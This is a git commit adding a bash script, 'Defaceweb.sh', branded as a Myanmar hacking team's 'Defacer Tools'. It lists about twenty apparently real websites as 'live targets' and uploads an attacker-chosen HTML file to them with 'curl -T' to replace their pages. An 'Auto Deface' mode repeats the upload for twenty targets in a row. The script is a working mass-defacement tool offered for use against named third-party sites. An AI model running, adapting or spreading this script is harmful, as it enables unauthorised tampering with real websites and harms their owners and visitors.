722332f74e5c7e76daff67f0728f1df4713ec37c
Hydra_z4l(Myat Myat Htun) <125865996+Htoosansain@users.noreply.github.com>
2024-12-01 09:12:54 +0630

    Add files via upload

---
+++ Defaceweb.sh
@@ -0,0 +1,409 @@
+#Gila_coding
+green="\033[92;1m"
+yellow="\033[93;1m"
+indigo="\033[94;1m"
+red="\033[95;1m"
+purple="\033[95;1m"
+cyan="\033[96;1m"
+white="\033[97;1m"
+pkg install toilet -y
+bash jr.sh
+echo ''
+echo -e $green
+echo "Loading.............";
+sleep 0.1;
+clear
+echo -e $green
+echo 'Myanmar CYBER ARMY.........................';
+sleep 0.1;
+clear
+echo -e $green
+echo 'Loading.................';
+sleep 0.1;
+clear
+echo -e $red
+echo 'Myanmar CYBER ARMY............................................';
+sleep 0.4;
+echo -e $green
+echo "Loading..................................";
+sleep 0.1;
+clear
+echo -e $green
+echo  'Myanmar CYBER ARMY...............';
+sleep 0.1;
+clear
+echo -e $green
+echo 'Loading................................................';
+sleep 0.1;
+clear
+echo -e $red
+echo 'Myanmar CYBER ARMY...........................';
+sleep 0.1;
+echo -e $green
+echo "Loading.........................................";
+sleep 0.1;
+clear
+echo -e $green
+echo 'Myanmar CYBER ARMY....................................................';
+sleep 0.1;
+clear
+echo -e $green
+echo 'Loading................................';
+sleep 0.1;
+clear
+echo -e $red
+echo 'Myanmar CYBER ARMY............................................';
+sleep 0.1;
+echo -e $green
+echo "Loading.....................................";
+sleep 0.1;
+clear
+echo -e $green
+echo 'Myanmar CYBER ARMY.............................';
+sleep 0.1;
+clear
+echo -e $green
+echo 'Loading........................................................';
+sleep 0.1;
+clear
+echo -e $red
+echo 'Myanmar CYBER ARMY........................';
+sleep 0.1;
+clear
+echo -e $green
+echo "Loading.............................................";
+sleep 0.1;
+clear
+echo -e $green
+echo 'Myanmar CYBER ARMY................';
+sleep 0.1;
+clear
+echo -e $green
+echo 'Loading.................................';
+sleep 0.1;
+clear
+echo -e $red
+echo 'Myanmar CYBER ARMY...................................................';
+sleep 0.1;
+echo -e $green
+echo "Loading....................................";
+sleep 0.1;
+clear
+echo -e $green
+echo "Loading.............................................";
+sleep 0.1;
+clear
+echo -e $green
+echo 'Myanmar CYBER ARMY................';
+sleep 0.1;
+clear
+echo -e $green
+echo 'Loading.................................';
+sleep 0.1;
+clear
+echo -e $red
+echo 'Myanmar CYBER ARMY...................................................';
+sleep 0.1;
+echo -e $green
+echo "Loading....................................";
+sleep 2;
+clear
+echo ''
+echo ''
+echo ''
+echo ''
+toilet -f future "    Defacer Tools" | lolcat
+echo ''
+echo -e $red"##########################"$green" WELCOME "$red"###########################"
+echo -e $yellow
+sleep 1
+echo -e " \e[1;31m 
+
+\033[0;36m     111     111         111          111     111    1111111111
+\033[0;36m     111 111 111        11 11         111     111       111
+\033[0;33m     111  1  111       1111111        111 111 111       111
+\033[0;39m     111     111      11     11       111     111       111
+\033[0;37m     111     111 🌟  11       11  🌟  111     111   🌟  111
+                                                                                                                                                                      
+\033[0;33m••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••  
+\033[0;33m[+] 𝗔𝗨𝗧𝗛𝗢𝗥      🌟  z4l    
+\033[0;33m[+] 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞    🌟  Myanmar Anonymous Helper Team
+\033[0;33m[+] 𝗚mail       🌟  myanmaranonymoushelper@gmail.com
+\033[0;33m[+] 𝗙rom        🌟  Shan state
+\033[0;36m[+] 𝗧𝗘𝗔𝗠        🌟  Myanmar Anonymous Helper Team
+\033[0;33m[+] 𝗩𝗘𝗥𝗦𝗜𝗢𝗡     🌟\x1b[1;97m  1.0.1    \x1b[1;97m          
+\033[0;33m••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••  
+\e[0m "
+
+echo ""
+sleep 1
+echo ''
+echo -e $red"##########################"$green" WELCOME "$red"###########################"
+echo ''
+echo -e $indigo"	~"$cyan"{"$white"A"$cyan"}"$green"."$yellow"Tebas Index"$cyan
+echo -e $indigo"        ~"$cyan"{"$white"B"$cyan"}"$green"."$yellow"Scan Website"$cyan
+echo -e $indigo"	~"$cyan"{"$white"C"$cyan"}"$green"."$yellow"Auto Deface"$cyan
+echo ''
+echo -e $cyan"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
+echo
+echo -e $indigo"  +"$cyan"{"$white"T"$cyan"}"$purple"."$green"TUTORIAL & LIVE TARGET"$indigo"      +"$cyan"{"$white"I"$cyan"}"$green"Info"$indigo"      +"$cyan"{"$white"Q"$cyan"}"$green"Quit"$cyan
+echo -e $cyan"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
+echo -e $indigo"=============================================================="
+echo ''
+echo -e $white "╭─"$yellow"CHOOSE"$cyan" ~/ICA"$white
+read -p " ╰─$ "  apaan
+echo ''
+if [ $apaan = "A" ] || [ $apaan = "a" ]
+then
+echo ''
+clear
+echo ''
+echo ''
+toilet -f future "Deface Tebas Index" | lolcat
+echo ''
+echo -e $red "HTML File Must be Located In Internal Memory Folder "
+echo ''
+echo -e $yellow "List Target"
+echo -e $red "http://contsol.co.za"
+echo -e $white "http://colourfactory.co.za"
+echo -e $red "http://chillibitez.co.za"
+echo -e $white "http://chasingfantasia.com"
+echo -e $red "http://centraltech.co.za"
+echo -e $white "http://cblandscapes.co.za"
+echo -e $red "http://crimsonmonkeyweb.com"
+echo -e $white "http://kevinbutho.com"
+echo -e $red "http://prorepafrica.com"
+echo -e $white "http://xposurephotography.co.za"
+echo -e $red "http://windmillsandporcupines.co.za"
+echo -e $white "http://tcnig.co.za"
+echo -e $red "http://ayk.co.za"
+echo -e $white "http://thehellenic.co.za"
+echo -e $red "http://valdicare.co.za"
+echo -e $white "http://scnc.co.za"
+echo -e $red "http://bitsandpieces.co.za"
+echo -e $white "http://itsengineering.co.za"
+echo -e $red "http://windmillsandporcupines.co.za"
+echo -e $white "http://floralandfresh.co.za"  
+echo ''
+echo -e $red "DONE!!! Select Website Target!"
+echo -e $green "╭─"$blue"CHOOSE"$cyan" ~/ICA"$white
+read -p " ╰─$ "  target
+echo ''
+echo -e $red "Select Script You Want To Use!!! "
+echo -e $green "╭─"$blue"CHOOSE"$cyan" ~/The Name SC Must (index.html) Change First There"$white
+read -p " ╰─$ "  script
+curl -T /storage/emulated/0/$script $target
+echo -e $red "["$yellow"Hacked"$red"]"$cyan"～～～＞"$green" $target"
+echo ''
+echo -e $cyan"["$yellow"B"$cyan"]"$white"Back "$cyan"["$yellow"E"$cyan"]"$white"EXIT"
+read -p "[B/E] : " back
+fi
+
+if [ $apaan = "B" ] || [ $apaan = "b" ]
+then
+echo ''
+clear
+echo ''
+cd Files
+php kamu.php
+echo ''
+echo -e $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"E"$cyan"]"$white"EXIT"
+read -p "[B/E] : " back
+fi
+
+if [ $apaan = "C" ] || [ $apaan = "c" ]
+then
+echo ''
+echo ''
+clear
+echo ''
+echo ''
+toilet -f future "Auto Deface 20 website" | lolcat
+echo ''
+echo -e $cyan " Mass Deface 20 Website"
+echo ''
+echo -e $red"###"$blue" CTRL + C to quit"$red" ###"
+echo ''
+echo ''
+echo ''
+echo -e $green "Select Script !!!!"
+echo ''
+echo -e $white "╭─"$green"CHOOSE"$cyan" ~/ICA"$white
+read -p " ╰─$ " script
+echo ''
+echo ''
+echo -e $white"Select Target1 !!!!"
+echo -e $white "╭─"$green"MiSetya"$cyan" ~/ICA"$white
+read -p " ╰─$ " target1
+curl -T /storage/emulated/0/$script $target1
+echo -e$cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target1/$script"
+echo ''
+echo -e $white"Select Target2 !!!!"
+echo -e $white "╭─"$green"MiSetya"$cyan" ~/ICA"$white
+read -p " ╰─$ " target2
+curl -T /storage/emulated/0/$script $target2
+echo -e $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target2/$script"
+echo ''
+echo -e $white"Select Target3 !!!!"
+echo -e $white "╭─"$green"MiSetya"$cyan" ~/ICA"$white
+read -p " ╰─$ " target3
+curl -T /storage/emulated/0/$script $target3
+echo -e $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target3/$script"
+echo ''
+echo -e $white"Select Target4 !!!!"
+echo -e $white "╭─"$green"MiSetya"$cyan" ~/ICA"$white
+read -p " ╰─$ " target4
+curl -T /storage/emulated/0/$script $target4
+echo -e $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target4/$script"
+echo ''
+echo -e $white"Select Target5 !!!!"
+echo -e $white "╭─"$green"MiSetya"$cyan" ~/ICA"$white
+read -p " ╰─$ " target5
+curl -T /storage/emulated/0/$script $target5
+echo -e $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target5/$script"
+echo ''
+echo -e $white"Select Target6 !!!!"
+echo -e $white "╭─"$green"MiSetya"$cyan" ~/ICA"$white
+read -p " ╰─$ " target6
+curl -T /storage/emulated/0/$script $target6
+echo -e $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target6/$script"
+echo ''
+echo -e $white"Select Target7 !!!!"
+echo -e $white "╭─"$green"MiSetya"$cyan" ~/ICA"$white
+read -p " ╰─$ " target7
+curl -T /storage/emulated/0/$script $target7
+echo -e $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target7/$script"
+echo ''
+echo -e $white"Select Target8 !!!!"
+echo -e $white "╭─"$green"MiSetya"$cyan" ~/ICA"$white
+read -p " ╰─$ " target8
+curl -T /storage/emulated/0/$script $target8
+echo -e $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target8/$script"
+echo ''
+echo -e $white"Select Target9 !!!!"
+echo -e $white "╭─"$green"MiSetya"$cyan" ~/ICA"$white
+read -p " ╰─$ " target9
+curl -T /storage/emulated/0/$script $target9
+echo -e $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target9/$script"
+echo ''
+echo -e $white"Select Target10 !!!! "
+echo -e $white "╭─"$green"MiSetya"$cyan" ~/ICA"$white
+read -p " ╰─$ " target10
+curl -T /storage/emulated/0/$script $target10
+echo -e $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target10/$script"
+echo ''
+echo -e $white"Select Target11 !!!! "
+echo -e $white "╭─"$green"MiSetya"$cyan" ~/ICA"$white
+read -p " ╰─$ " target11
+curl -T /storage/emulated/0/$script $target11
+echo -e $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target11/$script"
+echo ''
+echo -e $white"Select Target12 !!!! "
+echo -e $white "╭─"$green"MiSetya"$cyan" ~/ICA"$white
+read -p " ╰─$ " target12
+curl -T /storage/emulated/0/$script $target12
+echo -e $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target12/$script"
+echo ''
+echo -e $white"Select Target13 !!!! "
+echo e $white "╭─"$green"MiSetya"$cyan" ~/ICA"$white
+read -p " ╰─$ " target13
+curl -T /storage/emulated/0/$script $target13
+echo -e $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target13/$script"
+echo ''
+echo -e $white"Select Target14 !!!! "
+echo -e $white "╭─"$green"MiSetya"$cyan" ~/ICA"$white
+read -p " ╰─$ " target14
+curl -T /storage/emulated/0/$script $target14
+echo -e $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target14/$script"
+echo ''
+echo -e $white"Select Target15 !!!! "
+echo -e $white "╭─"$green"MiSetya"$cyan" ~/ICA"$white
+read -p " ╰─$ " target15
+curl -T /storage/emulated/0/$script $target15
+echo -e $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target15/$script"
+echo ''
+echo -e $white"Select Target16 !!!! "
+echo -e $white "╭─"$green"MiSetya"$cyan" ~/ICA"$white
+read -p " ╰─$ " target16
+curl -T /storage/emulated/0/$script $target16
+echo -e $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target16/$script"
+echo ''
+echo -e $white"Select Target17 !!!! "
+echo -e $white "╭─"$green"MiSetya"$cyan" ~/ICA"$white
+read -p " ╰─$ " target17
+curl -T /storage/emulated/0/$script $target17
+echo -e $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target17/$script"
+echo ''
+echo -e $white"Select Target18 !!!! "
+echo -e $white "╭─"$green"MiSetya"$cyan" ~/ICA"$white
+read -p " ╰─$ " target18
+curl -T /storage/emulated/0/$script $target18
+echo -e $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target18/$script"
+echo ''
+echo -e $white"Selectn Target19 !!!! "
+echo -e $white "╭─"$green"MiSetya"$cyan" ~/ICA"$white
+read -p " ╰─$ " target19
+curl -T /storage/emulated/0/$script $target19
+echo -e $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target19/$script"
+echo ''
+echo -e $white"Select Target20 !!!! "
+echo -e $white "╭─"$green"MiSetya"$cyan" ~/ICA"$white
+read -p " ╰─$ " target20
+curl -T /storage/emulated/0/$script $target20
+echo -e $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target20/$script"
+echo ''
+echo ''
+echo -e $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"E"$cyan"]"$white"EXIT"
+read -p "[B/E] : " back
+fi
+
+if [ $apaan = "I" ] || [ $apaan = "i" ]
+then
+echo ''
+echo ''
+clear
+echo ''
+echo ''
+toilet -f future "   Informasi Tools" | lolcat
+echo ''
+echo -e $red"##########################"$green" WELCOME "$red"###########################"
+echo -e $green"Author             : Myanmar Anonymous Helper Team - Online Class			"
+echo -e $purple"Telegram Channel   : https://t.me/Myanmar_anonymous_helper_team"
+echo -e $white"Tiktok Channel     : https://www.tiktok.com/@myanmar.anonymous.ht"
+echo ''
+echo -e $yellow"                          THANKS TO :"
+echo ''
+echo -e $red"[+] Myanmar Anonymous Helper Team - Online Class"
+echo -e $white"[+] Mr. Z4lhydr4 "
+echo -e $red"##########################"$green" WELCOME "$red"###########################"
+echo -e $indigo"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
+echo ''
+echo -e $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"E"$cyan"]"$white"EXIT"
+read -p "[B/Q] " back
+fi
+
+if [ $apaan = "T" ] || [ $apaan = "t" ]
+then
+cat tutorial.txt
+echo ''
+echo -e $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"E"$cyan"]"$white"EXIT"
+read -p "[B/Q] " back
+fi
+
+if [ $apaan = "Q" ] || [ $apaan = "q" ]
+then
+echo -e $green " Thank You For Using These Tools :) "
+exit
+clear
+fi
+
+
+if [ $back = "B" ] || [ $back = "b" ]
+then
+sh TEBAS.sh
+fi
+
+if [ $back = "e" ] || [ $back = "E" ]
+then
+clear
+fi
